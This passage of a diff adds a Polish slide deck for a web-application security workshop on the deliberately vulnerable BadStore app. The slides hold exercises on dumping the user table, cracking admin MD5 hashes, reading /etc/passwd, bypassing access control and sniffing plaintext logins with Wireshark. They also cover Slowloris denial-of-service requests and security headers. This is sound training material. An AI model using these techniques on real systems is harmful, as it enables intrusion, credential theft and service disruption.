+								<li>Wyświetlenie informacji o użytkownikach. Podpowiedź - tabela z użytkownikami to <i>userdb</i>, nazw kolumn można się domyśleć 
+								na podstawie formularzy logowania i zakładania konta.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 198px; display: none;" data-node-uid="128">
+						<h2>Ćwiczenie 9</h2>
+						<ul>
+							<li>Zalogowanie na konto administratora. Podpowiedź - hasła zapisane są w formie haszy. Wartość można znaleźć np. tutaj <a href="https://md5.gromweb.com/">https://md5.gromweb.com/</a>.</li>
+						</ul>
+					</section>
+				</section>
+					
+				<section style="top: 0px; display: none;" aria-hidden="true" class="stack future" hidden="">	
+					<section style="top: 252px; display: none;" data-node-uid="129">
+						<h2>Ćwiczenie 10</h2>
+						<ul>
+								<li>Wyświetlenie zawartości pliku <i>/etc/passwd</i></li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 106px; display: none;" data-node-uid="130" class="" aria-hidden="true">
+						<h2>Ćwiczenie 11</h2>
+						<p style="text-align: left;">Wyszukanie innych podatności w aplikacji np.:</p>
+						<ul>
+								<li>Znalezienie ukrytych funkcjonalności administracyjnych.</li>
+								<li>Obejście logiki aplikacji – złożenie zamówienia z miejszą kwotą do zapłaty.</li>
+								<li>Weryfikacja zawartości plików cookie.
+						</li></ul>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 252.5px; display: none;" data-node-uid="131" class="" aria-hidden="true">
+						<h2>Ankieta</h2>
+						<a href="http://bit.ly/ankieta0902">http://bit.ly/ankieta0902</a>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 279.5px; display: none;" data-node-uid="132" class="" aria-hidden="true">
+						<h2>Broken Access Control</h2>
+					</section>
+				
+					<section class="future" aria-hidden="true" style="top: 168px; display: none;" data-node-uid="133" hidden="">
+						<h3>Broken Access Control (I)</h3>
+						<p>Uzyskanie przez atakującego dostępu do danych, do których nie 
+powinien mieć dostępu, obiektów należących do innego użytkownika, 
+funkcjonalności i stron dla użytkowników o innym zakresie uprawnień. 
+					</p></section>
+					
+					<section class="future" aria-hidden="true" style="top: 194px; display: none;" data-node-uid="134" hidden="">
+						<h3>Broken Access Control (II)</h3>
+						Przykładowo informacje na temat użytkownika wyświetlane są w odpowiedzi na żądanie: 
+						<pre><code class="hljs http" data-trim="" contenteditable=""><span class="hljs-keyword">GET</span> <span class="hljs-string">/app/accountInfo?acct=myacct</span> HTTP/1.1</code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="135" hidden="">
+						<h3>Broken Access Control (III)</h3>
+						Inny przykład załadowanie plików za pomocą żądania: 
+						<pre><code class="hljs http" data-trim="" contenteditable=""><span class="hljs-keyword">GET</span> <span class="hljs-string">/servlet.gupld?show=292258</span> HTTP/1.1</code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="136" hidden="">
+						<h3>Broken Access Control - Testowanie (I)</h3>
+						<ul>
+							<li>Aby sprawdzić potencjalną podatność, dla każdej strony 
+dostępnej tylko dla użytkowników zalogowanych należy zweryfikować, czy 
+dane na niej zawarte lub ich część może być uzyskana również bez 
+zalogowania.</li>
+						</ul>
+					</section>
+
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="137" hidden="">
+						<h3>Broken Access Control - Testowanie (II)</h3>
+						<ul>
+							<li>Dodatkowo jeśli w części aplikacji dostępnej po zalogowaniu 
+występują dane lub funkcje dostępne jedynie dla części użytkowników 
+należy zweryfikować 
+							czy w każdym przypadku poprawnie weryfikowane są uprawnienia 
+użytkownika.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="138" hidden="">
+						<h3>Broken Access Control - Testowanie (III)</h3>
+						<ul>
+							<li>Standardowe przykłady podatności dotyczą błędów pozwalających
+ na wyświetlenie danych innego użytkownika przez zmianę identyfikatora 
+przekazywanego 
+							bezpośrednio do zapytania do bazy danych lub też błędów 
+pozwalających na wykonanie pewnej akcji przez znajomość adresu URL lub 
+struktury żądania.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 105.5px; display: none;" data-node-uid="139" class="" aria-hidden="true">
+						<h2>Ćwiczenie 12</h2>
+						<p style="text-align: left;">Testy podatności kategorii Broken 
+Access Control. Testy należy wykonać z wykorzystaniem konta 
+administratora i konta zwykłego użytkownika. Podpowiedź: <i>?action=adminportal</i> i <i>?action=admin</i>
+						<br><br>Zakres rozszerzony - utworzenie konta administratora.
+						</p>				
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+	
+					<section style="top: 279.5px; display: none;" data-node-uid="140" class="" aria-hidden="true">
+						<h2>Wireshark</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 140.5px; display: none;" data-node-uid="141" hidden="">
+						<h3>Wireshark</h3>
+						<p>Umożliwia przechwytywanie i nagrywanie pakietów danych, a także
+ ich dekodowanie. Dzięki dużej ilości dodatków potrafi rozpoznać i 
+zdekodować 
+						wiele protokołów komunikacyjnych. W głównej mierze jest 
+wykorzystywany przez administratorów sieci.</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 135px; display: none;" data-node-uid="142" hidden="">
+						<h3>Filtrowanie i wyszukiwanie w Wireshark</h3>
+						<p>Przydatne podczas korzystania z Wireshark:</p>
+						<ul>
+							<li>Filtry np. <i>ip.addr == 192.168.1.14</i></li>
+							<li>Podążaj -&gt; Strumień TCP</li>
+							<li>Wyszukiwanie - Szczegóły pakietu - String</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="143" hidden="">
+						<h3>Wireshark - GUI</h3>
+						<img alt="Wireshark" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/wireshark.png" data-lazy-loaded="" height="498">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="144" hidden="">
+						<h3>Wireshark - Wyszukiwanie po zawartości pakietu</h3>
+						<img alt="Wireshark wyszukiwanie" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/wireshark_szukaj.png" data-lazy-loaded="" height="458">
+					</section>
+				</section>
+					
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 188px; display: none;" data-node-uid="145" class="" aria-hidden="true">
+						<h2>Ćwiczenie 13</h2>
+						<p style="text-align: left;">Podsłuchanie komunikacji nieszyfrowanej. Wyświetlenie loginów i haseł wpisanych podczas logowania.</p>					
+					</section>
+				</section>
+				
+				<!---
+				<section>
+					<section>
+						<h2>Ataki Slow HTTP - Slowloris</h2>
+					</section>
+					
+					<section>
+						<h2>Slowloris (I)</h2>
+						<p>Podczas ataku tworzona jest duża liczba gniazd, a następnie w specyficzny powolny sposób dosyłane są dane częściowych żądań HTTP, tak aby podtrzymać 
+						połączenie, co po pewnym czasie skutkuje wyczerpaniem puli wolnych wątków obsługujących żądania HTTP. 
+						<br>
+						Jeśli osiągnięta zostanie maksymalna liczba równoczesnych połączeń serwer będzie odrzucać dodatkowe próby połączenia od innych klientów.
+						</p>
+					</section>	
+						
+					<section>
+						<h3>Slowloris (II)</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							Host: elka.pw.edu.pl.pl&lt;CRLF&gt;
+							User-Agent: Mozilla Firefox&lt;CRLF&gt;
+							Connection:keep-alive&lt;CRLF&gt;
+							X-Custom-Header: wartość nagłówka&lt;CRLF&gt;
+							&lt;SP&gt;dalsza wartość nagłówka&lt;CRLF&gt;
+							&lt;CRLF&gt;
+							Ciało zapytania
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Slowloris (III)</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							Host: elka.pw.edu.pl.pl&lt;CRLF&gt;
+							User-Agent: Mozilla Firefox&lt;CRLF&gt;
+							Connection:keep-alive&lt;CRLF&gt;
+							X-Custom-Header: wartość nagłówka&lt;CRLF&gt;
+							&lt;SP&gt;dalsza wartość nagłówka&lt;CRLF&gt;
+							&lt;SP&gt;X-a: b&lt;CRLF&gt;
+							&lt;SP&gt;X-a: b&lt;CRLF&gt;
+							&lt;SP&gt;X-a: b&lt;CRLF&gt;
+							&lt;SP&gt;X-a: b&lt;CRLF&gt;
+						</code></pre>
+						<a href="https://sekurak.pl/ataki-slow-http-dos-cz-1-slowloris/">Więcej informacji - Sekurak</a> | 
+						<a href="https://github.com/shekyan/slowhttptest">Narzędzie do testów - SlowHTTPTest</a>
+					</section>
+				</section>
+				-->
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 279.5px; display: none;" data-node-uid="146" class="" aria-hidden="true">
+						<h2>Skanery automatyczne</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 123.5px; display: none;" data-node-uid="147" hidden="">
+						<h3>Skanery automatyczne</h3>
+						<ul>
+							<li>Arachni</li>
+							<li>Nikto</li>
+							<li>Burp Suite</li>
+							<li>OWASP ZAP</li>
+							<li>OpenVas</li>
+							<li>Skipfish</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 22px; display: none;" data-node-uid="148" hidden="">
+						<h3>Arachni</h3>
+						<img alt="Arachni" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/Arachni.png" data-lazy-loaded="" height="478">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="149" hidden="">
+						<h3>OpenVas</h3>
+						<img alt="OpenVas" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/openvas.png" data-lazy-loaded="" height="498">
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 279.5px; display: none;" data-node-uid="150" class="" aria-hidden="true">
+						<h2>Nagłowki bezpieczeństwa</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 96px; display: none;" data-node-uid="151" hidden="">
+						<h3>Nagłowki bezpieczeństwa</h3>
+						Zaleca się dodanie standardowych nagłówków bezpieczeństwa:
+						<ul>
+							<li>X-Frame-Options,</li>
+							<li>Content Security Policy,</li>
+							<li>X-XSS-Protection,</li>
+							<li>HTTP Strict Transport Security (HSTS).</li>
+						</ul>
+						<a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project">Projekt OWASP Secure Headers</a>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 96px; display: none;" data-node-uid="152" hidden="">
+						<h3>X-Frame-Options</h3>
+						<ul>
+							<li>Nagłówek zabezpiecza przed atakami typu Clickjacking.</li>
+							<li>Najczęściej w miejscu wskazanym użytkownikowi do kliknięcia 
+znajduje się niewidoczna ramka &lt;iframe&gt;, która przechwytuje 
+kliknięcia, które wykonują pewną akcję w podatnej aplikacji.</li>
+							<li><a href="https://sekurak.pl/clickjacking-i-dwie-kropki-opis-bledu-w-facebooku/">Przyklad podatności - Sekurak.</a></li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="153" hidden="">
+						<h3>Content Security Policy</h3>
+						<i>Content Security Policy pozwala twórcy aplikacji webowej na 
+ścisłe zdefiniowanie, skąd mogą pochodzić dodatkowe zasoby, z których 
+korzysta aplikacja www (pliki zewnętrzne JavaScript czy CSS, obrazki i 
+inne elementy multimedialne). <br><br>Ograniczenie to ma zapobiegać atakom XSS, które dołączają do źródeł strony skrypty doczytywane z innych lokalizacji sieciowych.</i>
+						<br><a href="https://sekurak.pl/czym-jest-content-security-policy/">Sekurak - Czym jest Content Security Policy?</a>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="154" hidden="">
+						<h3>X-XSS-Protection (I)</h3>
+						<ul>
+							<li>Nagłówek podaje w jaki sposób ma być wykorzystany wbudowany filtr przeciwdziałający atakom Reflected XSS.</li>
+							<li>Działanie filtru przeglądarki opiera się na sprawdzeniu czy w
+ treści przesyłanego żądania HTTP znajdują się tagi HTML lub fragmenty 
+kodu JavaScript – oraz czy później wysyłane fragmenty kodu znajdują się w
+ odpowiedzi, jeśli tak wykonanie takiego kodu jest blokowane.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="155" hidden="">
+						<h3>X-XSS-Protection (II)</h3>
+						<pre><code class="hljs ldif" data-trim="" contenteditable=""><span class="hljs-attribute">X-XSS-Protection</span>: 0
+<span class="hljs-attribute">X-XSS-Protection</span>: 1
+<span class="hljs-attribute">X-XSS-Protection</span>: 1; mode=block
+<span class="hljs-attribute">X-XSS-Protection</span>: 1; report=&lt;reporting-uri&gt;</code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="156" hidden="">
+						<h3>X-XSS-Protection: 0</h3>
+						<p>
+						Filtr XSS jest wyłączony, nie jest wykorzystywana ochrona po stronie przeglądarki.
+						</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="157" hidden="">
+						<h3>X-XSS-Protection: 1</h3>
+						<p>
+						Filtr XSS jest włączony (zazwyczaj domyślne w przeglądarkach). W 
+przypadku wykrycia ataku Cross-Site Scripting, przeglądarka usuwa ze 
+strony fragmenty uznane za niebezpieczny skrypt.
+						</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="158" hidden="">
+						<h3>X-XSS-Protection: 1; mode=block</h3>
+						<p>
+						Filtr XSS jest włączony w trybie, w którym wykrycie próby ataku 
+XSS skutkuje przerwaniem renderowania strony (wyświetlana jest tylko 
+biała strona).
+						</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="159" hidden="">
+						<h3>X-XSS-Protection: 1; report=&lt;reporting-uri&gt;</h3>
+						<p>
+						Opcja dostępna tylko w przeglądarce Chromium - filtr XSS jest 
+włączony, w przypadku wykrycia ataku Cross-Site Scripting przeglądarka 
+usuwa ze strony fragmenty uznane za niebezpieczny skrypt i zgłasza 
+naruszenie;<br><br> w tym celu wykorzystywana jest funkcjonalność dyrektywy report-uri mechanizmu CSP, wykorzystywanej do raportowania naruszeń.
+						</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="160" hidden="">
+						<h3>Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (I)</h3>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="161" hidden="">
+						<h3>Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (II)</h3>
+						<ul>
+							<li>Nagłówek należy ustawiać jako X-XSS-Protection: 1; 
+mode=block, standardowo uznaje się że jest to najbezpieczniejsza opcja –
+ zalecana m. in. przez OWASP.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="162" hidden="">
+						<h3>Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (III)</h3>
+						<ul>
+							<li>Nie jest zalecane zostawianie domyślnych wartości nagłówka, 
+ponieważ wielokrotnie pokazane zostało, że w specyficznych przypadkach 
+filtr XSS ustawiony jako X-XSS-Protection: 1 może spowodować wykonanie 
+wprowadzonego skryptu w sytuacji, w której bez filtra nie było to 
+możliwe.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="163" hidden="">
+						<h3>X-XSS-Protection (III)</h3>
+						<ul>
+							<li>Nagłówek bezpieczeństwa wprowadzał podatność tam gdzie jej nie było!</li>
+							<li>Implementacja filtra polegała na zastąpieniu fragmentu uznanego za niebezpieczny skrypt znakiem #.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="164" hidden="">
+						<h3>X-XSS-Protection (IV)</h3>
+						<ul>
+							<li>Błędy w implementacji powodowały że przez # zastępowany był 
+fragment tagu HTML, payload nie był zmieniany, a modyfikacja innego 
+elementu strony np. zamknięcia tagu style umożliwiała wykonanie ataku z 
+wykorzystaniem składni CSS.</li>
+						</ul>
+						<a href="https://www.slideshare.net/masatokinugawa/xxn-en">Prezentacja na temat podatności</a>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="165" hidden="">
+						<h3>HTTP Strict Transport Security (HSTS)</h3>
+						<ul>
+							<li>HTTP Strict Transport Security (HSTS) jest mechanizmem 
+bezpieczeństwa sieci, który chroni strony przed atakami takimi, jak 
+wymuszona zmiana poziomu protokołu oraz przechwytywanie sesji.</li>
+							<li>Dzięki jego zastosowaniu przeglądarka łączy się tylko korzystając z połączeń HTTPS.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 215px; display: none;" data-node-uid="166" class="" aria-hidden="true">
+						<h2>Ćwiczenie 14</h2>
+						<p style="text-align: left;">Weryfikacja obecności nagłowków bezpieczeństwa w aplikacji BadStore oraz wybranej innej np. Facebook.</p>					
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+				
+					<section style="top: 279.5px; display: none;" data-node-uid="167" class="" aria-hidden="true">
+						<h2>Podsumowanie</h2><h2>
+					</h2></section>	
+						
+					<section class="future" aria-hidden="true" style="top: 123.5px; display: none;" data-node-uid="168" hidden="">
+					<h3>Podsumowanie (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Organizacja OWASP – materiały i narzędzia OWASP</li>
+							<li>OWASP Top 10</li>
+							<li>Podstawowe informacje dotyczące aplikacji webowych</li>
+							<li><b>Skanowanie portów</b></li>
+						</ul>
+					</section>
+						
+					<section class="future" aria-hidden="true" style="top: 123.5px; display: none;" data-node-uid="169" hidden="">
+					<h3>Podsumowanie (II)</h3>
+						<ul>
+							<li><b>Przegląd baz danych podatności</b></li>
+							<li><b>Narzędzia typu lokalnego Proxy</b></li><b>
+							</b><li><b>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</b></li>
+							<li><b>Ataki CSRF, przygotowanie przykładowej strony HTML wykonującej atak</b></li><b>
+						</b></ul><b>
+					</b></section><b>
+					
+					</b><section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="170" hidden=""><b>
+					<h3>Podsumowanie (III)</h3>
+						</b><ul><b>
+							<li>SQL Injection</li>
+							<li>Podatności kategorii Broken Access Control</li>
+							</b><li><b>Podsłuchanie komunikacji nieszyfrowanej z wykorzystaniem Wireshark</b></li>
+							<li>Ataki Slow HTTP</li>
+							<li>Skanery umożliwiające automatyczne testy bezpieczeństwa</li>
+							<li><b>Nagłówki bezpieczeństwa</b></li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="text-align: left; top: 257px; display: none;" data-background="pictures/tlo_1.jpg" data-state="dimbg" data-background-image="pictures/tlo_1.jpg" class="future" data-node-uid="171" aria-hidden="true" hidden="">
+					<h1>Dziękuję za uwagę</h1>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+				<section style="top: 279.5px; display: none;" data-node-uid="172" class="" aria-hidden="true">
+				<h2>Organizacyjne</h2>
+				</section>
+				
+				<section style="text-align: left; top: 330px; display: none;" data-background="pictures/Slajd2.JPG" class="future" data-background-image="pictures/Slajd2.JPG" data-node-uid="173" aria-hidden="true" hidden="">
+					<h2 id="no-header">Organizacyjne (I)</h2>
+				</section>
+				
+				<section style="text-align: left; top: 330px; display: none;" data-background="pictures/Slajd3.JPG" class="future" data-background-image="pictures/Slajd3.JPG" data-node-uid="174" aria-hidden="true" hidden="">
+					<h2 id="no-header">Organizacyjne (II)</h2>
+				</section>
+				
+				<section style="text-align: left; top: 330px; display: none;" data-background="pictures/Slajd4.JPG" class="future" data-background-image="pictures/Slajd4.JPG" data-node-uid="175" aria-hidden="true" hidden="">
+					<h2 id="no-header">Organizacyjne (III)</h2>
+				</section>
+				
+				<section style="text-align: left; top: 330px; display: none;" data-background="pictures/Slajd5.JPG" class="future" data-background-image="pictures/Slajd5.JPG" data-node-uid="176" aria-hidden="true" hidden="">
+					<h2 id="no-header">Organizacyjne (IV)</h2>
+				</section>
+				
+				</section>
+			</div>
+
+		<div class="backgrounds"><div class="slide-background past" data-background-hash="pictures/tlo_1.jpgnullnullnullnullnullnullnullnull" style="display: none; background-image: url(&quot;pictures/tlo_1.jpg&quot;);" data-loaded="true"></div><div class="slide-background stack past" style="display: block;" data-loaded="true"><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background present" style="display: block;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack past" style="display: block;" data-loaded="true"><div class="slide-background present" style="display: block;" data-loaded="true"></div><div class="slide-background future" style="display: block;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack present" style="display: block;" data-loaded="true"><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background past" style="display: none;" data-loaded="true"></div><div class="slide-background past" style="display: block;" data-loaded="true"></div><div class="slide-background past" style="display: block;" data-loaded="true"></div><div class="slide-background present" style="display: block;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: block;" data-loaded="true"><div class="slide-background present" style="display: block;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: block;" data-loaded="true"><div class="slide-background present" style="display: block;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;"><div class="slide-background present" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;"></div></div><div class="slide-background stack future" style="display: none;" data-loaded="true"><div class="slide-background present" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;" data-loaded="true"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: none;"></div><div class="slide-background future" style="display: 